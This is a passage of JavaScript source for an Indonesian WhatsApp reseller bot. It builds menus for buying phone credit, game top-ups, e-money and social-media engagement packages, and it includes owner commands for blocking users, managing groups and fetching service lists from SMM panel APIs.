          	`3. Beragam Pilihan Produk: Tersedia berbagai pilihan produk, seperti game, pulsa, token PLN, dan banyak lagi.\n\n` +
          	`*Ayo Mulai Bisnis Anda Sekarang!*\n` +
          	`- Upgrade ke Level VIP: Rp 30.000,00\n` +
          	`- Upgrade ke Level VVIP: Rp 60.000,00\n\n` +
          	`Tidak ada batasan waktu, Anda dapat menjadi Reseller Produk Digital bersama Bot dipaysecure!\n\n` +
          	`Jadi, tertarik untuk menjadi seorang Reseller? Silahkan ketik:\n` +
          	`*.upgrade [vip / vvip]*\n\n` +
          	`Contoh:\n` +
          	`*.upgrade vip*`

          	reply(lo);
          }
          break;
          case "upgraderolesmm":
          {
          	var lo = 
          	`*Upgrade ke Level Reseller Premium!*\n\n` +
          	`Apakah Anda ingin membawa bisnis produk digital Anda ke level berikutnya? Upgrade peran Anda menjadi Silver atau Gold sekarang untuk menikmati manfaat luar biasa berikut:\n\n` +
          	`*Manfaat Upgrade:*\n` +
          	`1. Harga Produk Lebih Murah: Dapatkan harga produk yang lebih rendah, memberikan keuntungan besar dalam bisnis produk digital Anda.\n` +
          	`2. Proses Otomatisasi: Mudah dan efisien. Tidak perlu ribet dengan pembuatan situs web, semuanya dapat diatur melalui WhatsApp.\n` +
          	`3. Beragam Pilihan Produk: Tersedia berbagai pilihan produk, seperti SMM, dan banyak lagi.\n\n` +
          	`*Ayo Mulai Bisnis Anda Sekarang!*\n` +
          	`- Upgrade ke Level GOLD: Rp 30.000,00\n` +
          	`- Upgrade ke Level Platinum: Rp 60.000,00\n` +
          	`- Upgrade ke Level Partner: Rp 60.000,00\n\n` +
          	`Tidak ada batasan waktu, Anda dapat menjadi Reseller Produk Digital bersama Bot dipaysecure!\n\n` +
          	`Jadi, tertarik untuk menjadi seorang Reseller? Silahkan chat Owner:\n` +
          	`*.owner*\n\n` +
          	`Contoh:\n` +
          	`*.upgrade vip*`

          	reply(lo);
          }
          break;
          case "owner":
          {
          	var owner_Nya = global.owner;
          	sendContact(from, owner_Nya, global.ownername, m);
          	reply("Chat aja kak, ga usah malu");
          }
          break;
          case "setlevel": {
          	if (!isOwner) return m.reply(mess.owner);
        // Split command into userId and newLevel
        let [userId, newLevel] = text.split("|");
        if (!userId)
        	return m.reply(
        		`Input ID / No Hp Menggunakan 628\nContoh : setlevel 6285174332583|gold`
        		);
        if (
        	!newLevel ||
        	!["member", "gold", "platinum", "partner"].includes(
        		newLevel.toLowerCase()
        		)
        	)
        	return m.reply(
        		`Input Levelnya (Huruf Kecil): *member, gold, platinum, partner*\nContoh : setlevel 6285174332583|gold`
        		);

        // Update user level and price
        updateLevelAndPrice(userId, newLevel.toLowerCase());
        break;
    }


    async function generateAndSendWAMessage(m, Anu, listMessage, botname, owner, newslatter, kris) {
    	const msg = generateWAMessageFromContent(
    		m.chat,
    		{
    			viewOnceMessage: {
    				message: {
    					messageContextInfo: {
    						deviceListMetadata: {},
    						deviceListMetadataVersion: 2,
    					},
    					interactiveMessage: proto.Message.InteractiveMessage.create({
    						contextInfo: {
    							mentionedJid: [m.sender],
    							isForwarded: true,
    							forwardedNewsletterMessageInfo: {
    								newsletterJid: "bjirr@newsletter",
    								newsletterName: `Powered By ${newslatter}`,
    								serverMessageId: -1,
    							},
    							businessMessageForwardInfo: {
    								businessOwnerJid: kris.decodeJid(kris.user.id),
    							},
    						},
    						body: proto.Message.InteractiveMessage.Body.create({
    							text: Anu,
    						}),
    						footer: proto.Message.InteractiveMessage.Footer.create({
    							text: botname,
    						}),
    						header: proto.Message.InteractiveMessage.Header.create({
    							title: '',
    							subtitle: "ownername",
    							hasMediaAttachment: true,
    							...(await prepareWAMessageMedia(
    							{
    								image: {
    									url: "https://iili.io/dbQBob9.md.jpg",
    								},
    							},
    							{ upload: kris.waUploadToServer }
    							)),
    						}),
    						nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
    							buttons: [
    							{
    								name: "single_select",
    								buttonParamsJson: JSON.stringify(listMessage),
    							},
    							{
    								name: "cta_url",
    								buttonParamsJson: `{"display_text":"Creator","url":"https://wa.me/${owner}","merchant_url":"https://wa.me/${owner}"}`,
    							},
    							],
    						}),
    					}),
    				},
    			},
    		},
    		{}
    		);

    	return msg;
    }

    case "menu":
    {
    	var slo = cek("saldo", m.sender);
    	if (cek("id", m.sender) == null) {
    		daftarr(); 
    		reply(
    			`_Silahkan ketik *menu* kembali_`
    			);

    	}

    	Anu = `🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*\n` +
    	`⚝ *I N F O - B O T* ⚝\n\n` +
    	`≡ *NamaBot* : ${namabot}\n` +
    	`≡ *Nama* : ${pushname}\n` +
    	`≡ *Nomor Owner* : ${owner}\n` +
    	`≡ *Saldo* : ${formatmoney(slo)}\n` +
    	`≡ *Role Topup* : ${cek("role", m.sender)}\n` +
    	`≡ *Role Smm* : ${cek("level", m.sender)}\n`;

    	let sections = [
    	{
    		title: "Menu Topup 🛒",
    		highlight_label: "New",
    		rows: [
    		{
    			title: "Top-Up Pulsa",
    			description: `Displays Top-Up Pulsa`,
    			id: ".pulsa",
    		},
    		{
    			title: "Top-Up Kuota",
    			description: `Displays Top-Up Kuota`,
    			id: ".kuota",
    		},
    		{
    			title: "Top-Up Games",
    			description: `Displays Top-Up Games`,
    			id: ".topupgames",
    		},
    		{
    			title: "Top-Up E-Money",
    			description: `Displays Top-Up E-Money`,
    			id: ".topupemoney",
    		},
    		{
    			title: "Top-Up Voucher",
    			description: `Displays Top-Up Voucher`,
    			id: ".menuvoucher",
    		},
    		{
    			title: "Top-Up Token",
    			description: `Displays Top-Up Token`,
    			id: ".pln",
    		},
    		],
    	},
    	{
    		title: "Suntik Smm Menu 🤖",
    		highlight_label: "New Menu 🤖",
    		rows: [
    		{
    			title: "Display Layanan Tiktok",
    			description: `Layanan tiktok`,
    			id: ".tiktok",
    		},
    		{
    			title: "Display Layanan Instagram",
    			description: `Displays Layanan Instagram`,
    			id: ".instagram",
    		},
    		{
    			title: "Display Layanan Youtube",
    			description: `Displays Layanan Youtube`,
    			id: ".youtube",
    		},
    		{
    			title: "Display Layanan Facebook",
    			description: `Displays Display Layanan Facebook`,
    			id: ".facebook",
    		},
    		],
    	},
    	{
    		title: "Menu Cek ID 🐱‍🚀",
    		highlight_label: "Cek ID Games",
    		rows: [
    		{
    			title: "Displays Games",
    			description: `Displays Cek ID Games`,
    			id: ".cekgame",
    		},
    		{
    			title: "Displays Bank",
    			description: `Displays Cek Name BANK`,
    			id: ".cekbank",
    		},
    		{
    			title: "Displays E-Wallet",
    			description: `Displays Cek E-Wallet`,
    			id: ".cekwallet"
    		}
    		],

    	},
    	{
    		title: "List Menu 🧾",
    		highlight_label: "✅",
    		rows: [
    		{
    			title: "Owner Menu",
    			description: `Displays Owner Menu`,
    			id: ".ownermenu",
    		},
    		{
    			title: "Deposit Manual",
    			description: `Displays Deposit Manual`,
    			id: ".manual",
    		},
    		{
    			title: "Deposit Otomatis",
    			description: `Deposit Otomatis`,
    			id: ".otomatis",
    		},
    		{
    			title: "List Transaksi",
    			description: `Displays List Trx`,
    			id: ".listtrx",
    		},
    		{
    			title: "Upgrade Role TopUp",
    			description: `Displays Upgrade Role TopUp`,
    			id: ".upgraderole",
    		},
    		{
    			title: "Upgrade Role SMM",
    			description: `Displays Upgrade Role SMM`,
    			id: ".upgraderolesmm",
    		},
    		{
    			title: "List Deposit",
    			description: `Display List Deposit`,
    			id: ".listdeposit",
    		},
    		{
    			title: "Cek Saldo",
    			description: `Display Ceksaldo`,
    			id: ".ceksaldo",
    		},
    		{
    			title: "Batal Deposit",
    			description: `Displays Batal Deposit`,
    			id: ".ndepo",
    		},
    		],
    	},
    	];

    	let listMessage = {
    		title: "Menu Disini",
    		sections,
    	};

    	const msg = await generateAndSendWAMessage(m, Anu, listMessage, namabot, owner, newslatter, kris);

    	await kris.relayMessage(msg.key.remoteJid, msg.message, {
    		messageId: msg.key.id,
    	});
    }
    break;
    case "tiktok":
    {
    	var slo = cek("saldo", m.sender);
    	if (cek("id", m.sender) == null) {
    		daftarr(); 
    		reply(
    			`_Silahkan ketik *menu* kembali_`
    			);

    	}


    	Anu = 
    	`🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*\n` +
    	`⚝ *I N F O - B O T* ⚝\n\n` +
    	`≡ *NamaBot* : ${namabot}\n` +
    	`≡ *Nama* : ${pushname}\n` +
    	`≡ *Nomor Owner* : ${owner}\n` +
    	`≡ *Saldo* : ${formatmoney(slo)}\n` +
    	`≡ *Role Topup* : ${cek("role", m.sender)}\n` +
    	`≡ *Role Smm* : ${cek("level", m.sender)}\n`;

    	let sections = [
    	{
    		title: "List Menu Tiktok🧾",
    		highlight_label: "✅",
    		rows: [
    		{ title: "Tiktok Views", description: "Displays Tiktok Views", id: ".ttview" },
    		{ title: "Tiktok Followers Update", description: "Displays Tiktok Followers Update", id: ".tiktokfollowersupdate" },
    		{ title: "Tiktok Followers", description: "Displays Tiktok Followers", id: ".tiktokfollowers" }
    		]
    	}
    	];

    	let listMessage = {
    		title: "Menu Disini",
    		sections,
    	};

    	const msg = await generateAndSendWAMessage(m, Anu, listMessage, namabot, owner, newslatter, kris);

    	await kris.relayMessage(msg.key.remoteJid, msg.message, {
    		messageId: msg.key.id,
    	});
    }
    break;
    case "instagram":
    {
    	var slo = cek("saldo", m.sender);
    	if (cek("id", m.sender) == null) {
    		daftarr(); 
    		reply(
    			`_Silahkan ketik *menu* kembali_`
    			);

    	}


    	Anu = 
    	`🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*\n` +
    	`⚝ *I N F O - B O T* ⚝\n\n` +
    	`≡ *NamaBot* : ${namabot}\n` +
    	`≡ *Nama* : ${pushname}\n` +
    	`≡ *Nomor Owner* : ${owner}\n` +
    	`≡ *Saldo* : ${formatmoney(slo)}\n` +
    	`≡ *Role Topup* : ${cek("role", m.sender)}\n` +
    	`≡ *Role Smm* : ${cek("level", m.sender)}\n`;

    	let sections = [
    	{
    		title: "List Menu Instagram🧾",
    		highlight_label: "✅",
    		rows: [
    		{ title: "Instagram Likes", description: "Displays Instagram Likes", id: ".instagramlikes" },
    		{ title: "Instagram Followers", description: "Displays Followers ❎", id: ".instagramfollowers" },
    		{ title: "Instagram Views", description: "Displays Instagram Views ❎", id: ".instagramviews" }
    		]
    	}
    	];

    	let listMessage = {
    		title: "Menu Disini",
    		sections,
    	};

    	const msg = await generateAndSendWAMessage(m, Anu, listMessage, namabot, owner, newslatter, kris);

    	await kris.relayMessage(msg.key.remoteJid, msg.message, {
    		messageId: msg.key.id,
    	});
    }
    break;
    case "block":
    {
    	if (!isOwner) throw mess.owner;

    	let users = m.mentionedJid[0]
    	? m.mentionedJid[0]
    	: m.quoted
    	? m.quoted.sender
    	: text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

          // Send a pre-block message
          await kris.sendMessage(users, {
          	text: `Kamu Akan Diblacklist/Blokir, Untuk Informasi Lebih Lanjut Silahkan Hubungi Admin wa.me/${owner}`,
          });

          // Introduce a 2-second delay
          setTimeout(async () => {
            // Update block status
            await kris
            .updateBlockStatus(users, "block")
            .then(() => {
                // Write to block.json
                const blockedUsers =
                JSON.parse(
                	fs.readFileSync("./Pengaturan/database/block.json", "utf8")
                	) || [];
                if (!blockedUsers.includes(users)) {
                	blockedUsers.push(users);
                	fs.writeFileSync(
                		"./Pengaturan/database/block.json",
                		JSON.stringify(blockedUsers, null, 2),
                		"utf8"
                		);
                }
                m.reply("Sip, Berhasil Memblokir Pengguna");
            })
            .catch((err) => m.reply(jsonformat(err)));
          }, 5000); // 2000 milliseconds (2 seconds)
      }
      break;
      case "unblock":
      {
      	if (!isOwner) throw mess.owner;

      	let users = m.mentionedJid[0]
      	? m.mentionedJid[0]
      	: m.quoted
      	? m.quoted.sender
      	: text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

          // Update block status
          await kris
          .updateBlockStatus(users, "unblock")
          .then(async () => {
              // Send a message after unblocking
              await kris.sendMessage(users, {
              	text: "Blacklist Telah Dibuka, Harap Tidak Melanggar Peraturan Kembali:)",
              });

              // Remove user from block.json
              const blockedUsers =
              JSON.parse(
              	fs.readFileSync("./Pengaturan/database/block.json", "utf8")
              	) || [];
              const index = blockedUsers.indexOf(users);
              if (index !== -1) {
              	blockedUsers.splice(index, 1);
              	fs.writeFileSync(
              		"./Pengaturan/database/block.json",
              		JSON.stringify(blockedUsers, null, 2),
              		"utf8"
              		);
              }

              m.reply("Sip, Berhasil Membuka Blokir Pengguna");
          })
          .catch((err) => m.reply(jsonformat(err)));
      }
      break;

      case "kick": 
      {

      	console.log(from)

      	let users = m.mentionedJid[0]
      	? m.mentionedJid[0]
      	: m.quoted
      	? m.quoted.sender
      	: text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

      	console.log(users)

      	if (multiowner.includes(cek("id", m.sender))) {
      		const response = await kris.groupParticipantsUpdate(
      			from, 
      			[users],
      			"remove" 
      			)

      		const prettyJsonString = JSON.stringify(response, null, 2);
      		console.log(response)
      		reply(prettyJsonString)
      	} else {
      		reply("_Dihhh ikut ikut_")
      	}
      }
      break;

      case "close": 
      {

      	console.log(from)

      	if (multiowner.includes(cek("id", m.sender))) {
      		const response = await kris.groupSettingUpdate(from, 'announcement')
      	} else {
      		reply("_Dihhh ikut ikut_")
      	}
      }
      break;

      case "open": 
      {

      	console.log(from)

      	if (multiowner.includes(cek("id", m.sender))) {
      		const response = await kris.groupSettingUpdate(from, 'not_announcement')
      	} else {
      		reply("_Dihhh ikut ikut_")
      	}
      }
      break;

      case "h": 
      {

      	console.log(from);

      	const msg = text;

      	if (multiowner.includes(cek("id", m.sender))) {
      		try {

      			const response = await kris.groupMetadata(from);
      			console.log(response.participants);

      			await kris.sendMessage(from, { 
      				text: msg, 
      				mentions: response.participants.map(a => a.id) 
      			}, { quoted: m });

      		} catch (error) {
      			console.error("Error fetching group metadata:", error);
      			await kris.sendMessage(from, { text: "Terjadi kesalahan saat mengambil data grup." }, { quoted: m });
      		}
      	} else {

      		await kris.sendMessage(from, { text: "_Dihhh ikut ikut_" }, { quoted: m });
      	}
      }
      break;


      case "getsosmed": {
      	if (!isOwner) return m.reply(`khusus owner`);

      	var config = {
          method: "POST", // Set the HTTP method to POST
          url: "https://irvankedesmm.co.id/api/services", // Set the target URL
          data: new URLSearchParams(
          	Object.entries({
          		api_id: idsmm,
          		api_key: smm,
          	})
          	),
      };

      axios(config)
      .then(function (response) {
      	if (response.data.status == false) {
      		m.reply(`pesan: ${response.data.data.pesan}`);
      		return;
      	}

      	let data = JSON.stringify(response.data.data);

            // Simpan data ke file
            fs.writeFileSync("./Pengaturan/database/datasmm.json", data);
            m.reply(`Berhasil Get Layanan Sosmed`);
        })
      .catch((error) => {
      	console.log("Gagal", error);
      	m.reply(`GAGAL Get Layanan Sosmed`);
      });
      break;
  }
  case "getsosmed2": {
  	if (!isOwner) return m.reply(`khusus owner`);

  	var config = {
          method: "POST", // Set the HTTP method to POST
          url: "https://buzzerpanel.id/api/json.php", // Set the target URL
          data: new URLSearchParams(
          	Object.entries({
          		api_key: smmm,
          		action: "services",
          		secret_key: idsmmm,
          	})
          	),
      };

      axios(config)
      .then(function (response) {
      	if (response.data.status == false) {
      		m.reply(`pesan: ${response.data.data.msg}`);
      		return;
      	}

      	let data = JSON.stringify(response.data.data);

            // Simpan data ke file
            fs.writeFileSync("./Pengaturan/database/datasmm2.json", data);
            m.reply(`Berhasil Get Layanan Sosmed`);
        })
      .catch((error) => {
      	console.log("Gagal", error);
      	m.reply(`GAGAL Get Layanan Sosmed`);
      });
      break;
  }

  case "cekgame": 
  {
  	reply(`*Daftar CEK ID GAME* \n\nMobile Legends - [cekml] \nFree Fire - [cekff] \nHiggs Domino - [cekhd]`);
  }
  break;

  case "ownermenu":
  {
  	var slo = cek("saldo", m.sender);
  	console.log(cek("id", m.sender))
  	if (cek("id", m.sender) !== `${owner}@s.whatsapp.net`) {

  		return reply(
  			`_Permintaan Di Tolak Anda Bukan *Owner*_`
  			);
  	}

  	Anu = 
  	`🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*\n` +
  	`⚝ *I N F O - B O T* ⚝\n\n` +
  	`≡ *NamaBot* : ${namabot}\n` +
  	`≡ *Nama* : ${pushname}\n` +
  	`≡ *Nomor Owner* : ${owner}\n` +
  	`≡ *Saldo* : ${formatmoney(slo)}\n` +
  	`≡ *Role* : ${cek("role", m.sender)}\n\n` +
  	`*Berikut List Owner Menu*`;

  	let sections = [
  	{
  		title: "Owner Menu 🤖",
  		highlight_label: "Owner Menu 🤖",
  		rows: [
  		{ title: "Display Setting Profit", description: "Setting Profit", id: ".setprofit" },
  		{ title: "Get Layanan Topup", description: "Displays Get Layanan", id: ".getdigi" },
  		{ title: "Get Layanan Sosmed", description: "Displays Get Layanan Sosmed", id: ".getsosmed" },
  		{ title: "Cek Saldo Pusat Sosmed", description: "Displays Cek Saldo Pusat Sosmed", id: ".saldosmm" },
  		{ title: "Delete Layanan", description: "Displays Delete Layanan", id: ".resetlayanan" },
  		{ title: "Block User", description: "Displays Block User", id: ".block" },
  		{ title: "Unblock User", description: "Displays Unblock User", id: ".unblock" },
  		{ title: "Cek Saldo Pusat Topup", description: "Displays Cek Saldo Pusat Topup", id: ".saldodigi" },
  		{ title: "Nambah Saldo User", description: "Displays Nambah Saldo User", id: ".addsaldo" },
  		{ title: "Kurangin Saldo User", description: "Displays Kurangin Saldo User", id: ".minsaldo" },
  		{ title: "Terima Deposit Manual", description: "Displays Terima Deposit Manual", id: ".acc" },
  		{ title: "Tolak Deposit Manual", description: "Displays Tolak Deposit Manual", id: ".tolak" },
  		{ title: "Mengambil IP", description: "Displays Mengambil IP", id: ".getip" },
  		{ title: "Rekap Transaksi", description: "Displays Rekap Transaksi", id: ".rekaptrx" }
  		]
  	}
  	];

  	let listMessage = {
  		title: "Pilih Menu Owner",
  		sections,
  	};

  	const msg = await generateAndSendWAMessage(m, Anu, listMessage, namabot, owner, newslatter, kris);

  	await kris.relayMessage(msg.key.remoteJid, msg.message, {
  		messageId: msg.key.id,
  	});
  }
  break;

  case "topupgames":
  {
  	var slo = cek("saldo", m.sender);
  	if (cek("id", m.sender) == null) {
  		daftarr(); 
  		reply(
  			`_Silahkan ketik *menu* kembali_`
  			);

  	}


  	Anu = `🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*\n` +
  	`⚝ *I N F O - B O T* ⚝\n\n` +
  	`≡ *NamaBot* : ${namabot}\n` +
  	`≡ *Nama* : ${pushname}\n` +
  	`≡ *Nomor Owner* : ${owner}\n` +
  	`≡ *Saldo* : ${formatmoney(slo)}\n` +
  	`≡ *Role* : ${cek("role", m.sender)}\n\n` +
  	`*Berikut List Topup Games*`;

  	let sections = [
  	{
  		title: "List Menu Topup Games 🧾",
  		highlight_label: "Games",
  		rows: [
  		{ title: "Diamonds Mobile Legends", description: "Displays Mobile Legends", id: ".ml" },
  		{ title: "Diamonds Freefire", description: "Display Diamonds FreeFire", id: ".ff" },
  		{ title: "UC Pubg Mobile", description: "Displays UC Pubg", id: ".pubg" },
  		{ title: "Tokens Honor OF Kings", description: "Displays Honor OF Kings", id: ".hok" },
  		{ title: "Voucher Arena OF Valor", description: "Displays Arena OF Valor", id: ".aov" },
  		{ title: "Points Valorant", description: "Displays Valorant", id: ".valorant" },
  		{ title: "Garena Undawn", description: "Displays 8 Ball Pool", id: ".undawn" },
  		{ title: "Diamonds 8 Ball Pool", description: "Displays 8 Ball Pool", id: ".8pol" },
  		{ title: "Higgs Domino", description: "Displays Higgs Domino", id: ".higs" }
  		]
  	},
  	{
  		title: "Topup Membership 🛒",
  		highlight_label: "New",
  		rows: [
  		{ title: "Membership Mobile Legends", description: "Displays Weekly Mobile Legends", id: ".memberml" },
  		{ title: "Membership Freefire", description: "Displays Membership Freefire", id: ".memberff" }
  		]
  	}
  	];

  	let listMessage = {
  		title: "Pilih Gamesnya Disini",
  		sections,
  	};

  	const msg = await generateAndSendWAMessage(m, Anu, listMessage, namabot, owner, newslatter, kris);

  	await kris.relayMessage(msg.key.remoteJid, msg.message, {
  		messageId: msg.key.id,
  	});
  }
  break;
  case "pulsa":
  {
  	var slo = cek("saldo", m.sender);
  	if (cek("id", m.sender) == null) {
  		daftarr(); 
  		reply(
  			`_Silahkan ketik *menu* kembali_`
  			);

  	}


  	Anu = `🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*\n` +
  	`⚝ *I N F O - B O T* ⚝\n\n` +
  	`≡ *NamaBot* : ${namabot}\n` +
  	`≡ *Nama* : ${pushname}\n` +
  	`≡ *Nomor Owner* : ${owner}\n` +
  	`≡ *Saldo* : ${formatmoney(slo)}\n` +
  	`≡ *Role* : ${cek("role", m.sender)}\n\n` +
  	`*Berikut List Operator Pulsa*`;

  	let sections = [
  	{
  		title: "List Menu Operator 🧾",
  		highlight_label: "Menu Lists Operator",
  		rows: [
  		{ title: "Pulsa Axis", description: "Display Pulsa Axis", id: ".menupulsaaxis" },
  		{ title: "Pulsa Telkomsel", description: "Displays Pulsa Telkomsel", id: ".menupulsatelkomsel" },
  		{ title: "Pulsa Indosat", description: "Displays Pulsa Indosat", id: ".menupulsaindosat" },
  		{ title: "Pulsa Smartfren", description: "Display Pulsa Smartfren", id: ".menupulsasmartfren" },
  		{ title: "Pulsa XL", description: "Display Pulsa XL", id: ".menupulsaxl" },
  		{ title: "Pulsa Tri", description: "Display Pulsa Tri", id: ".menupulsatri" },
  		{ title: "Pulsa By.U", description: "Displays Pulsa By.U", id: ".menupulsabyu" }
  		]
  	}
  	];

  	let listMessage = {
  		title: "Pilih Operatornya Disini",
  		sections,
  	};

  	const msg = await generateAndSendWAMessage(m, Anu, listMessage, namabot, owner, newslatter, kris);

  	await kris.relayMessage(msg.key.remoteJid, msg.message, {
  		messageId: msg.key.id,
  	});
  }
  break;
  case "topupemoney":
  {
  	var slo = cek("saldo", m.sender);
  	if (cek("id", m.sender) == null) {
  		daftarr(); 
  		reply(
  			`_Silahkan ketik *menu* kembali_`
  			);

  	}


  	Anu = `🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*\n` +
  	`⚝ *I N F O - B O T* ⚝\n\n` +
  	`≡ *NamaBot* : ${namabot}\n` +
  	`≡ *Nama* : ${pushname}\n` +
  	`≡ *Nomor Owner* : ${owner}\n` +
  	`≡ *Saldo* : ${formatmoney(slo)}\n` +
  	`≡ *Role* : ${cek("role", m.sender)}\n\n` +
  	`*Berikut List Layanan E-Money*`;

  	let sections = [
  	{
  		title: "List Menu Emoney ✅",
  		highlight_label: "Menu Lists Emoney✅",
  		rows: [
  		{ title: "Layanan Dana", description: "Display Dana", id: ".dana" },
  		{ title: "Layanan Ovo", description: "Displays Layanan Ovo", id: ".ovo" },
  		{ title: "Layanan ShopeePay", description: "Displays Layanan Shopeepay", id: ".shopeepay" },
  		{ title: "Layanan Gopay/Gojek", description: "Display Layanan Gopay/Gojek", id: ".gopay" }
  		]
  	}
  	];

  	let listMessage = {
  		title: "Pilih Layanan Disini",
  		sections,
  	};

  	const msg = await generateAndSendWAMessage(m, Anu, listMessage, namabot, owner, newslatter, kris);

  	await kris.relayMessage(msg.key.remoteJid, msg.message, {
  		messageId: msg.key.id,
  	});
  }
  break;

  case "menuvoucher":
  {
  	var slo = cek("saldo", m.sender);
  	if (cek("id", m.sender) == null) {
  		daftarr(); 
  		reply(
  			`_Silahkan ketik *menu* kembali_`
  			);

  	}


  	Anu = `🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*\n` +
  	`⚝ *I N F O - B O T* ⚝\n\n` +
  	`≡ *NamaBot* : ${namabot}\n` +
  	`≡ *Nama* : ${pushname}\n` +
  	`≡ *Nomor Owner* : ${owner}\n` +
  	`≡ *Saldo* : ${formatmoney(slo)}\n` +
  	`≡ *Role* : ${cek("role", m.sender)}\n\n` +
  	`*Berikut List Layanan Voucher*`;

  	let sections = [
  	{
  		title: "List Menu Voucher ✅",
  		highlight_label: "Menu Lists Voucher ✅",
  		rows: [
  		{ title: "Google Play ID", description: "Google Play Indonesia", id: ".vc-playid" },
  		{ title: "Google Play US", description: "Google Play US Region", id: ".vc-tri" },
  		{ title: "GARENA", description: "Voucher GARENA", id: ".vc-garena" },
  		{ title: "Telkomsel", description: "Voucher Telkomsel", id: ".vc-telkomsel" },
  		{ title: "Indosat", description: "Voucher Indosat", id: ".vc-indosat" },
  		{ title: "Axis", description: "Voucher Axis", id: ".v-axis" },
  		{ title: "Tri", description: "Voucher Tri", id: ".vc-tri" },
  		{ title: "XL", description: "Voucher XL", id: ".vc-xl" },
  		]
  	}
  	];

  	let listMessage = {
  		title: "Klik Layanan Disini",
  		sections,
  	};

  	const msg = await generateAndSendWAMessage(m, Anu, listMessage, namabot, owner, newslatter, kris);

  	await kris.relayMessage(msg.key.remoteJid, msg.message, {
  		messageId: msg.key.id,
  	});
  }
  break;

  case "menupulsaindosat":
  {
  	var slo = cek("saldo", m.sender);
  	if (cek("id", m.sender) == null) {
  		daftarr();
  		reply(
  			`_Silahkan ketik *menu* kembali_`
  			);
  	}



  	Anu = `🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*\n` +
  	`⚝ *I N F O - B O T* ⚝\n\n` +
  	`≡ *NamaBot* : ${namabot}\n` +
  	`≡ *Nama* : ${pushname}\n` +
  	`≡ *Nomor Owner* : ${owner}\n` +
  	`≡ *Saldo* : ${formatmoney(slo)}\n` +
  	`≡ *Role* : ${cek("role", m.sender)}\n\n` +
  	`*Berikut List Pulsa Indosat*`;

  	let sections = [
  	{ 
  		title: "List Menu Pulsa Indosat 🧾", 
  		highlight_label: "Menu Lists Kuota Indosat", 
  		rows: [
  		{ title: "Pulsa Normal", description: "Display Pulsa Indosat", id: ".pulsaind" }, 
  		{ title: "Pulsa Transfer", description: "Displays Pulsa Indosat", id: ".pulsaind-transfer" }, 
  		{ title: "Pulsa Mix", description: "Displays Pulsa Indosat", id: ".pulsaind-mix" }, 
  		{ title: "Pulsa Gift", description: "Display Pulsa Indosat", id: ".pulsaind-gift" }, 
  		{ title: "Pulsa Reguler Combo", description: "Display Pulsa Indosat", id: ".pulsaind-reguler-combo" }, 
  		{ title: "Pulsa Combo Data", description: "Display Pulsa Indosat", id: ".pulsaind-combo-data" }
  		], 
  	},
  	];

  	let listMessage = {
  		title: "Pilih Paket Pulsa Disini",
  		sections,
  	};

  	const msg = await generateAndSendWAMessage(m, Anu, listMessage, namabot, owner, newslatter, kris);

  	await kris.relayMessage(msg.key.remoteJid, msg.message, {
  		messageId: msg.key.id,
  	});
  }
  break;

  case "menupulsatelkomsel":
  {
  	var slo = cek("saldo", m.sender);
  	if (cek("id", m.sender) == null) {
  		daftarr();
  		reply(
  			`_Silahkan ketik *menu* kembali_`
  			);
  	}



  	Anu = `🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*\n` +
  	`⚝ *I N F O - B O T* ⚝\n\n` +
  	`≡ *NamaBot* : ${namabot}\n` +
  	`≡ *Nama* : ${pushname}\n` +
  	`≡ *Nomor Owner* : ${owner}\n` +
  	`≡ *Saldo* : ${formatmoney(slo)}\n` +
  	`≡ *Role* : ${cek("role", m.sender)}\n\n` +
  	`*Berikut List Pulsa Telkomsel*`;

  	let sections = [
  	{ 
  		title: "List Menu Pulsa Telkomsel 🧾", 
  		highlight_label: "Menu List Pulsa Telkomsel", 
  		rows: [
  		{ title: "Pulsa Normal", description: "Display Pulsa Telkomsel", id: ".pulsatsel-umum" }, 
  		{ title: "Pulsa Transfer", description: "Displays Pulsa Telkomsel", id: ".pulsatsel-transfer" }, 
  		// { title: "Pulsa Mix", description: "Displays Pulsa Telkomsel", id: ".pulsatsel-mix" } 
  		// { title: "Pulsa Gift", description: "Display Pulsa Indosat", id: ".pulsaind-gift" }, 
  		// { title: "Pulsa Reguler Combo", description: "Display Pulsa Indosat", id: ".pulsaind-reguler-combo" }, 
  		// { title: "Pulsa Combo Data", description: "Display Pulsa Indosat", id: ".pulsaind-combo-data" }
  		], 
  	},
  	];

  	let listMessage = {
  		title: "Pilih Paket Pulsa Disini",
  		sections,
  	};

  	const msg = await generateAndSendWAMessage(m, Anu, listMessage, namabot, owner, newslatter, kris);

  	await kris.relayMessage(msg.key.remoteJid, msg.message, {
  		messageId: msg.key.id,
  	});
  }
  break;

  case "menupulsaaxis":
  {
  	var slo = cek("saldo", m.sender);
  	if (cek("id", m.sender) == null) {
  		daftarr();
  		reply(
  			`_Silahkan ketik *menu* kembali_`
  			);
  	}



  	Anu = `🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*\n` +
  	`⚝ *I N F O - B O T* ⚝\n\n` +
  	`≡ *NamaBot* : ${namabot}\n` +
  	`≡ *Nama* : ${pushname}\n` +
  	`≡ *Nomor Owner* : ${owner}\n` +
  	`≡ *Saldo* : ${formatmoney(slo)}\n` +
  	`≡ *Role* : ${cek("role", m.sender)}\n\n` +
  	`*Berikut List Pulsa Telkomsel*`;

  	let sections = [
  	{ 
  		title: "List Menu Pulsa Axis 🧾", 
  		highlight_label: "Menu Lists Pulsa Axis", 
  		rows: [
  		{ title: "Pulsa Normal", description: "Display Pulsa Axis", id: ".pulsaaxis-umum" }, 
  		{ title: "Pulsa Transfer", description: "Displays Pulsa Axis", id: ".pulsaaxis-transfer" }, 
  		{ title: "Pulsa Mix", description: "Displays Pulsa Axis", id: ".pulsaaxis-mix" } 
